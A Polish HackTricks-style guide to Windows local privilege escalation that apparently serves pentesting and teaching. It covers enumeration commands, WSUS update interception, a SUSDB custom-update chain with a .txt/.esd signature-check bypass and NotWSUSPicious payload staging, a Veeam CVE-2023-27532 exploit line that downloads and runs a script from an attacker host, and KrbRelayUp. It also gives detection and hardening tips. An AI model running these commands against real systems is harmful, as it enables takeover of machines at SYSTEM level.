# Lokalna eskalacja uprawnień w Windows

{{#include ../../banners/hacktricks-training.md}}

### **Najlepsze narzędzie do wyszukiwania wektorów lokalnej eskalacji uprawnień w Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Ta strona łączy ogólną metodologię eskalacji uprawnień w Windows z kilku podstawowych poradników.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Praktyczny proces enumeracji opiera się również na warsztatach społeczności i listach kontrolnych.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Materiały dotyczące historycznych ataków obejmują prezentację z DerbyCon na temat eskalacji uprawnień w Windows.<sup>[[5]](#references)</sup>

## Podstawy Windows

### Access Tokens

**Jeśli nie wiesz, czym są Windows access tokens, przed kontynuowaniem przeczytaj tę stronę:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Więcej informacji o ACLs - DACLs/SACLs/ACEs znajdziesz na tej stronie:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Poziomy integralności

**Jeśli nie wiesz, czym są poziomy integralności w Windows, przed kontynuowaniem przeczytaj tę stronę:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Mechanizmy zabezpieczeń Windows

W Windows różne mechanizmy mogą **uniemożliwić enumerację systemu**, uruchamianie plików wykonywalnych, a nawet **wykrywać Twoje działania**. Przed rozpoczęciem enumeracji na potrzeby eskalacji uprawnień należy **przeczytać** tę **stronę** i **wyliczyć** wszystkie te **mechanizmy obronne**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Dostęp fizyczny może też umożliwić przejście od edycji UEFI NVRAM w trybie offline do DMA przed uruchomieniem systemu i łańcucha modyfikacji pamięci Windows `SYSTEM`:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Ochrona administratora / cicha eskalacja UIAccess

Procesy UIAccess uruchamiane przez `RAiLaunchAdminProcess` można wykorzystać do uzyskania High IL bez monitów, gdy kontrole bezpiecznych ścieżek AppInfo zostaną ominięte. Szczegółowy przewodnik po omijaniu UIAccess/Admin Protection znajdziesz tutaj:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Propagację rejestru dostępności Secure Desktop można wykorzystać do dowolnego zapisu w rejestrze SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

W nowszych kompilacjach Windows pojawiła się również ścieżka LPE wykorzystująca **SMB na dowolnym porcie**, w której uprzywilejowane lokalne uwierzytelnianie NTLM jest odbijane przez ponownie użyte połączenie TCP SMB:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Informacje o systemie

Aby przeprowadzić lokalną inwentaryzację z istniejącej sesji PowerShell, zobacz [Enumeracja Windows za pomocą .NET](../basic-powershell-for-pentesters/dotnet-enumeration.md). Te przykłady uzupełniają poniższe kontrole i nie uruchamiają oddzielnych plików wykonywalnych do enumeracji.

### Enumeracja informacji o wersji

Sprawdź, czy dana wersja Windows ma znane podatności (sprawdź również zainstalowane poprawki).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Exploity zależne od wersji

Ta [strona](https://msrc.microsoft.com/update-guide/vulnerability) przydaje się do wyszukiwania szczegółowych informacji o lukach w zabezpieczeniach Microsoft. Ta baza danych zawiera ponad 4 700 luk, co pokazuje **ogromną powierzchnię ataku**, jaką stwarza środowisko Windows.

**W systemie**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ma wbudowany watson)_
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — zbiera informacje o kompilacji systemu operacyjnego, zainstalowanych aktualizacjach i wybranych potencjalnie pasujących biuletynach; przed uznaniem wyniku za odpowiedni sprawdź dokładny produkt i zastępujące go aktualizacje.

W przypadku lokalnego exploita zależnego od wersji sprawdź **architekturę uruchomionego procesu**, a także architekturę systemu operacyjnego. W 64-bitowym systemie Windows proces 32-bitowy podlega [przekierowaniu systemu plików WOW64](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` zwykle wskazuje katalog systemowy 32-bitowy, a `%windir%\Sysnative` umożliwia temu procesowi dostęp do natywnego katalogu systemowego. Alias ten jest niedostępny dla procesu 64-bitowego. Kompilacja systemu operacyjnego ani brak potencjalnie wymaganej aktualizacji KB nie dowodzą, że exploit zadziała; porównaj aktualną kompilację, zainstalowaną lub zastępującą ją aktualizację, architekturę procesu i wymagania exploita z [biuletynem bezpieczeństwa Microsoft](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) dotyczącym konkretnej luki.

Przykład błędu uszkodzenia pamięci usługi znajdziesz w opisie [przesunięć w pierścieniu pamięci współdzielonej MIDI kontrolowanych przez klienta](../../binary-exploitation/array-indexing.md#client-controlled-shared-memory-ring-positions). Opublikowane przesunięcia stosu dotyczą wyłącznie testowanej kompilacji; uzyskanie uprawnień `LOCAL SERVICE` to odrębny etap od późniejszego przejścia przez [SeImpersonate/EfsPotato](roguepotato-and-printspoofer.md) do `SYSTEM`.<sup>[[44]](#references)</sup>

**Lokalnie, z użyciem informacji o systemie**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Repozytoria exploitów na GitHubie:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Środowisko

Czy w zmiennych środowiskowych zapisano jakieś dane uwierzytelniające lub informacje typu Juicy?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Historia PowerShell

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

Zapisywalny [profil PowerShell](../basic-powershell-for-pentesters/#powershell-profile-startup-injection) to osobny trop związany z wykonywaniem kodu podczas uruchamiania; zanim uznasz go za wektor eskalacji uprawnień, sprawdź, czy użytkownik o wyższych uprawnieniach rzeczywiście ładuje ten profil.

### Pliki transkrypcji PowerShell

Dowiedz się, jak to włączyć, tutaj: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` to tylko przykład. [Zasady transkrypcji PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) zazwyczaj zapisują pliki w folderze Dokumenty każdego użytkownika, ale ustawienie `OutputDirectory` lub parametr `-OutputDirectory` w poleceniu `Start-Transcript` może przekierować pliki do folderu współdzielonego lub ukrytego. Przed przejrzeniem transkrypcji sprawdź efektywną ścieżkę wyjściową i uprawnienia ACL pliku: transkrypcja może zawierać argumenty poleceń i ich wyniki, w tym dane uwierzytelniające. Czytelna transkrypcja jest tylko wskazówką, o ile jej zawartość nie ujawnia danych tożsamości o wyższych uprawnieniach, których można użyć do logowania w odpowiednim kontekście.

### PowerShell Module Logging

Rejestrowane są szczegóły wykonywania potoku PowerShell, w tym wykonane polecenia, wywołania poleceń i fragmenty skryptów. Mogą jednak nie zostać zapisane wszystkie szczegóły wykonania ani wyniki.

Aby włączyć tę funkcję, postępuj zgodnie z instrukcjami w sekcji „Transcript files” dokumentacji, wybierając **„Module Logging”** zamiast **„Powershell Transcription”**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Aby wyświetlić 15 ostatnich zdarzeń z dzienników PowersShell, możesz wykonać:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### **Script Block Logging** w PowerShellu

Rejestrowany jest pełny przebieg aktywności oraz cała zawartość wykonywanego skryptu, dzięki czemu każdy blok kodu jest dokumentowany w trakcie działania. Proces ten zapewnia kompleksowy ślad audytowy każdej aktywności, przydatny w analizie kryminalistycznej i badaniu złośliwego działania. Dokumentowanie całej aktywności w chwili jej wykonywania zapewnia szczegółowy wgląd w przebieg procesu.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Zdarzenia rejestrowania bloków skryptów można znaleźć w Podglądzie zdarzeń systemu Windows w ścieżce: **Dzienniki aplikacji i usług > Microsoft > Windows > PowerShell > Operational**.\
Aby wyświetlić 20 ostatnich zdarzeń, możesz użyć:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Ustawienia internetowe

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Dyski

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Wcześniejsze wskazówki podsumowywały ryzyko w następujący sposób:

Możesz przejąć kontrolę nad systemem, jeśli aktualizacje są pobierane przez http, a nie http**S**.

Punkt końcowy WSUS korzystający z HTTP jest wskazówką do zbadania możliwości przechwycenia metadanych aktualizacji. Exploitation zależy również od tego, czy klient korzysta z tego serwera WSUS, czy atakujący może przechwycić ruch lub nad nim kontrolę oraz od zasad zaufania i instalowania aktualizacji po stronie klienta. Sam adres URL nie oznacza możliwości wykonania kodu. [Microsoft recommends TLS for WSUS metadata](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Zacznij od sprawdzenia, czy sieć korzysta z aktualizacji WSUS bez SSL, uruchamiając w cmd następujące polecenie:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Lub poniższe w PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Jeśli otrzymasz odpowiedź podobną do jednej z poniższych:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

A jeśli `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` lub `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` jest równe `1`.

Pierwotne stwierdzenie dotyczące możliwości wykorzystania luki brzmiało:

Wtedy **lukę można wykorzystać.** Jeśli wartość ostatniego wpisu rejestru jest równa `0`, wpis WSUS zostanie zignorowany.

Gdy `UseWUServer` ma wartość `1`, Windows Update używa skonfigurowanej usługi intranetowej. Potwierdza to spełnienie warunku wstępnego dla ścieżki przechwytywania ruchu HTTP, ale nie dowodzi, że przechwycenie, akceptacja złośliwej aktualizacji ani instalacja z podwyższonymi uprawnieniami są możliwe. Gdy ma wartość `0`, ta konkretna skonfigurowana usługa WSUS nie jest wybierana przez tę zasadę.

Aby wykorzystać te podatności, możesz użyć narzędzi takich jak: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) — są to uzbrojone skrypty do ataków MiTM, służące do wstrzykiwania „fałszywych” aktualizacji do ruchu WSUS bez SSL.

Przeczytaj badania tutaj:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Przeczytaj pełny raport tutaj**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Zasadniczo ta luka wykorzystuje następujący błąd:

> Jeśli możemy zmodyfikować proxy naszego lokalnego użytkownika, a Windows Updates korzysta z proxy skonfigurowanego w ustawieniach Internet Explorera, możemy uruchomić lokalnie [PyWSUS](https://github.com/GoSecure/pywsus), aby przechwycić własny ruch i uruchomić kod z podwyższonymi uprawnieniami na naszym zasobie.
>
> Ponadto, ponieważ usługa WSUS korzysta z ustawień bieżącego użytkownika, używa też jego magazynu certyfikatów. Jeśli wygenerujemy certyfikat z podpisem własnym dla nazwy hosta WSUS i dodamy go do magazynu certyfikatów bieżącego użytkownika, będziemy mogli przechwytywać zarówno ruch HTTP, jak i HTTPS WSUS. WSUS nie stosuje mechanizmów podobnych do HSTS, które zapewniałyby walidację certyfikatu typu trust-on-first-use. Jeśli certyfikat jest zaufany przez użytkownika i ma prawidłową nazwę hosta, usługa go zaakceptuje.

Możesz wykorzystać tę lukę za pomocą narzędzia [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (gdy zostanie udostępnione).

### Aktualizacje kontrolowane przez administratora WSUS

Istnieje osobna ścieżka, gdy bieżąca tożsamość może **publikować i zatwierdzać** aktualizacje na serwerze WSUS. Sprawdź efektywne członkostwo w grupie `WSUS Administrators` serwera oraz wszelkie delegowane uprawnienia WSUS, a następnie ustal, która grupa komputerów klienckich otrzymałaby zatwierdzoną aktualizację. [Microsoft wymaga uprawnień administratora WSUS do zatwierdzania aktualizacji](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate) i [dokumentuje relację zaufania przy publikowaniu](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): klienci muszą ufać certyfikatowi podpisującemu użytemu do publikowania lokalnej zawartości. Przed uznaniem tego za ścieżkę eskalacji potwierdź, że proponowana aktualizacja jest podpisana i akceptowana, dotyczy celu oraz jest instalowana w kontekście o wyższych uprawnieniach. Sama wartość HTTP `WUServer` lub nazwa grupy nie potwierdza spełnienia tych warunków.

### Nadużycie niestandardowych aktualizacji SUSDB: niepodpisane ładunki przez `.txt`/`.esd`

Jest to inne naruszenie granicy zaufania niż przechwycenie połączenia HTTP WSUS: warunkiem wstępnym jest uzyskanie wystarczającego dostępu do **procedur składowanych bazy WSUS (`SUSDB`)**, aby opublikować i zatwierdzić niestandardową aktualizację. Jedną z praktycznych dróg wejścia jest przekazanie uwierzytelnienia konta komputera upstream WSUS do osobnego serwera MSSQL hostującego `SUSDB`; dokładny warunek wstępny zależy od wdrożenia, dlatego najpierw wylicz uprawnienia `EXECUTE`, zamiast zakładać, że potrzebne są uprawnienia administratora SQL.<sup>[[38]](#references)[[39]](#references)</sup>

Informacje o osobnej ścieżce ataku, w której uwierzytelnienie klienta WSUS jest przekazywane z HTTP/8530 do LDAP, SMB lub AD CS, znajdziesz w sekcji [Abusing WSUS HTTP for NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Potwierdź przekazywanie uwierzytelnienia do zewnętrznej bazy danych i uprawnienia do procedur

We wdrożeniach, w których WSUS korzysta z zewnętrznego SQL Servera, najpierw sprawdź, czy konto serwera WSUS może uwierzytelnić się w bazie danych i czy przekazanie uwierzytelnienia NTLM dociera do tego listenera. Rola SQL serwera może zapewniać dostęp do procedur publikowania aktualizacji, nawet jeśli bezpośrednie zapisy do tabel są zabronione; nieudana operacja `UPDATE` w `SUSDB` nie dowodzi, że publikowanie jest zablokowane. Przed próbą opublikowania niestandardowej aktualizacji sprawdź efektywną tożsamość, członkostwo w rolach i uprawnienia do procedur w autoryzowanej sesji SQL.<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

Aktualne definicje procedur i zainstalowany plik `SoftwareDistributionPackage.xsd` są przydatne przy odtwarzaniu prawidłowych metadanych aktualizacji. Zarówno nadrzędny element bundle, jak i podrzędny element payload wymagają `UpdateIdentity` (typ fragmentu `1`), `LocalizedProperties` (`4`) oraz `ExtendedProperties` (`2`). Zapisz lokalny identyfikator rewizji zwrócony przez każde wywołanie `spImportUpdate` i zachowaj spójność relacji bundle, skrótów, rozmiaru, adresu URL zawartości oraz rewizji. Jest to stanowy proces publikowania, więc pojedyncze pomyślne wywołanie procedury składowanej nie dowodzi wykonania po stronie klienta.<sup>[[38]](#references)</sup>

#### Zbuduj, określ cel i zatwierdź aktualizację

Przepływ pracy związany z niestandardową aktualizacją wykorzystuje prawidłowe procedury WSUS jako ograniczone API publikowania. Ważne zmiany stanu to:<sup>[[38]](#references)</sup>

| Etap | Odpowiednie procedury składowane |
| --- | --- |
| Importuj metadane aktualizacji | `spImportUpdate` |
| Zapisz fragmenty XML dotyczące wymagań wstępnych, lokalizacji i właściwości rozszerzonych | `spSaveXMLFragment` |
| Powiąż skrót zawartości z kontrolowanym przez atakującego adresem URL | `spSetBatchURL` |
| Wyświetl/utwórz grupę komputerów i dodaj klienta | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Zatwierdź instalację dla tej grupy | `spDeployUpdate` z `@actionID = 0` i `@isAssigned = 1` |

Nazwa pliku, skróty, rozmiar i handler `CommandLineInstallation` muszą być zgodne w zaimportowanych metadanych i fragmentach. Po przypisaniu adresu URL zawartości i grupy docelowej końcowe zatwierdzenie wygląda podobnie do poniższego; użyj nowych identyfikatorów aktualizacji, grupy i wdrożenia zamiast ponownie wykorzystywać przykładowe GUID-y.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Obejście weryfikacji podpisu sterowane rozszerzeniem

WSUS zwykle odrzuca dowolną niepodpisaną zawartość wykonywalną. Jednak w `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` ścieżka .NET `VerifyFile` ustawia flagę sprawdzania certyfikatu na false, gdy podana nazwa pliku kończy się na `.txt` lub `.esd`; `CheckCertificateSignature` zostaje wtedy pominięte bez wcześniejszego potwierdzenia, że bajty są tekstem lub prawidłowym obrazem ESD. Dlatego niezmieniony plik PE o nazwie na przykład `payload.exe.txt` może przejść weryfikację zawartości, a następnie zostać uruchomiony przez moduł obsługi instalacji z wiersza poleceń aktualizacji. Jest to błąd typu pomylenie polityki i typu, a nie fałszowanie podpisu.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### Przygotowanie treści zgodne z BITS i automatyzacja

Wywołanie `spDeployUpdate` powoduje, że WSUS pobiera zarejestrowaną treść. Źródło musi spełniać wymagania HTTP protokołu BITS: sam dostępny URL nie wystarczy, ponieważ transfer obejmuje początkowy przepływ `HEAD`/`GET` oraz żądania zakresu bajtów. Serwer bez obsługi Range powoduje błąd synchronizacji WSUS `EventId=364` z komunikatem, że BITS wymaga nagłówka protokołu Range.<sup>[[39]](#references)</sup>

Research PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) generuje kod SQL wymagany do wykonania łańcucha importu/fragmentu/URL/grupy/wdrożenia, zawiera zmodyfikowanego klienta MSSQL do jego wykonania i udostępnia `BitsWebServer.py` do przygotowania treści. Minimalne wywołanie w autoryzowanym laboratorium:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Nienadzorowane wykonywanie i trwałość ponawiania prób

Interakcja po stronie klienta zależy od zasad. Ustawienie `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, opcja `4 - Auto download and schedule install`, powoduje pobranie i zainstalowanie zatwierdzonej aktualizacji zgodnie ze skonfigurowanym harmonogramem, bez konieczności ręcznego wybierania jej przez użytkownika. Podczas testów payload, którego aktualizacja pozostawała w stanie niepowodzenia/nieukończenia, był ponownie oferowany natychmiast po zakończeniu procesu callback, więc mechanizm ponawiania prób może zapewnić powtarzalną trwałość wykonywania; jest to jednak głośne, ponieważ klient ujawnia stan niepowodzenia aktualizacji.<sup>[[39]](#references)</sup>

#### Możliwości wykrywania i utwardzania

Przydatne punkty kontrolne po stronie serwera i klienta w tym łańcuchu to:<sup>[[39]](#references)</sup>

- Audytuj wykonywanie `spCreateTargetGroup`, `spSetBatchURL` i `spDeployUpdate` w `SUSDB`; sprawdzaj nowe grupy docelowe, zewnętrzne źródła treści, payloady aktualizacji `.txt`/`.esd` oraz wdrożenia wykonywane przez nieoczekiwane podmioty (zwłaszcza konta inne niż komputerowe).
- Sprawdzaj `C:\Program Files\Update Services\LogFiles` pod kątem `ContentSyncAgent`, `FileVerified`, błędnie zapisanego `FileVerficationFailed` oraz `EventId=364`; koreluj weryfikację z rozszerzeniem payloadu i sygnaturą jego zawartości, zamiast ufać rozszerzeniu.
- Wykrywaj wielokrotne niepowodzenia/ponawianie instalacji Windows Update oraz wykonywanie plików PE lub nieoczekiwaną aktywność procesów potomnych/sieciową z zawartości oznaczonej nazwami `.txt` lub `.esd`.
- Włącz Extended Protection for Authentication w usłudze bazy danych, jeśli jest obsługiwana, i ogranicz dostęp sieciowy do bazy danych do serwera WSUS oraz autoryzowanych systemów administracyjnych. Ogranicz i audytuj uprawnienia `EXECUTE` do procedur niestandardowych aktualizacji.

## Zewnętrzne programy aktualizujące i Agent IPC (local privesc)

Wiele agentów korporacyjnych udostępnia lokalny interfejs IPC oraz uprzywilejowany kanał aktualizacji. Jeśli można wymusić rejestrację z użyciem serwera atakującego, a program aktualizujący ufa fałszywemu głównemu urzędowi certyfikacji lub stosuje słabe weryfikacje podpisu, użytkownik lokalny może dostarczyć złośliwy MSI, który usługa SYSTEM zainstaluje. Uogólniony opis techniki (oparty na łańcuchu Netskope stAgentSvc – CVE-2025-0309) znajduje się tutaj:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM przez TCP 9401)

Oryginalny opis dotyczący konkretnych wersji oraz notatka z rozpoznania brzmiały:

Veeam B&R < `11.0.1.1261` udostępnia usługę localhost na **TCP/9401**, która przetwarza wiadomości kontrolowane przez atakującego, umożliwiając wykonywanie dowolnych poleceń jako **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup>

- **Recon**: potwierdź nasłuchujący port i wersję, np. za pomocą `netstat -ano | findstr 9401` oraz `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.

Veeam Backup & Replication i Cloud Connect domyślnie używają podstawowej usługi kopii zapasowych na **TCP/9401**. [Poradnik Veeam](https://www.veeam.com/kb4424) opisuje nieuwierzytelnione ujawnienie zaszyfrowanych poświadczeń bazy danych konfiguracji w obrębie perymetru sieci kopii zapasowych; oddzielny, publiczny PoC demonstruje ścieżkę wykonywania poleceń jako **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Usługa może nasłuchiwać na adresach innych niż localhost, dlatego sprawdź jej rzeczywisty adres i PID.

- **Recon**: potwierdź, że TCP/9401 należy do `Veeam.Backup.Service.exe`, a następnie sprawdź zainstalowany produkt i metadane poprawek. `netstat -ano | findstr 9401` oraz `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` są wskazówkami, ale nie stanowią pełnej weryfikacji poprawek.
- **Wersje zawierające poprawkę**: Veeam wskazuje **11a build 11.0.1.1261 P20230227** i **12 build 12.0.0.1420 P20230223** jako pierwsze wydania zawierające poprawkę; wcześniejsze wydania są podatne. Czteroczęściowy numer wersji pliku nie pozwala samodzielnie odróżnić niezałatanej wersji bazowej od późniejszej poprawki dla tych samych numerów buildów. Przed uznaniem granicznego buildu za poprawiony sprawdź identyfikator poprawki w [historii buildów dostawcy](https://www.veeam.com/kb2680).
- **Exploit**: umieść PoC, taki jak `VeeamHax.exe`, wraz z wymaganymi bibliotekami DLL Veeam w tym samym katalogu, a następnie uruchom payload SYSTEM przez lokalne gniazdo:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Usługa wykonuje polecenie jako SYSTEM.

Cytowany PoC demonstruje wykonanie polecenia jako SYSTEM, gdy spełnione są dodatkowe wymagania wstępne; advisory dostawcy opisuje problem ujawnienia poświadczeń.

## KrbRelayUp

Pierwotny opis domyślnego środowiska brzmiał:

W środowiskach Windows **domain** w określonych warunkach występuje podatność typu **local privilege escalation**. Warunki te obejmują środowiska, w których **LDAP signing nie jest wymuszane,** użytkownicy mają uprawnienia do konfigurowania **Resource-Based Constrained Delegation (RBCD)**, a użytkownicy mogą tworzyć komputery w domenie. Należy zauważyć, że te **wymagania** są spełnione przy użyciu **ustawień domyślnych**.

Lokalny Kerberos relay może umożliwić przejście od logowania z niższymi uprawnieniami do uprzywilejowanego zapisu w katalogu, jeśli odpowiedni serwer COM uwierzytelni się, a przekazana tożsamość ma uprawnienia do obiektu docelowego. [Dokumentacja KrbRelay](https://github.com/cube0x0/KrbRelay) opisuje zarówno zapisy LDAP RBCD, jak i `msDS-KeyCredentialLink` (shadow-credential); KrbRelayUp automatyzuje niektóre z tych ścieżek. Łańcuch RBCD wymaga odpowiednich uprawnień delegowania oraz uprawnień do obiektu docelowego, natomiast łańcuch shadow-credential wymaga uprawnień do zapisu klucza poświadczeń i KDC obsługującego ścieżkę uwierzytelniania certyfikatem. Żadna z tych ścieżek nie wynika z samego członkostwa w domenie.

Sprawdź rzeczywistą politykę [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) i [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding) na DC, ACL obiektu dla przekazywanej tożsamości oraz poziomy uwierzytelniania i impersonation wybranej klasy COM. Istotne są typ logowania wywołującego i kontekst poświadczeń: sesja WinRM może zachowywać się inaczej niż logowanie interaktywne lub logowanie z użyciem nowych poświadczeń. Wynik mogą też zmienić reguły zapory, routing OXID i zainstalowane aktualizacje. Traktuj permisywną politykę lub pasujący ACL jako element wymagający weryfikacji; pasywne wyliczanie nie powinno wywoływać COM coercion, uwierzytelniania relay ani zapisów w katalogu. Shadow credential konta komputera może umożliwić uzyskanie ticketu maszyny, a następnie — tylko jeśli to konto ma wymagane uprawnienia do replikacji katalogu — odrębną ścieżkę DCSync.

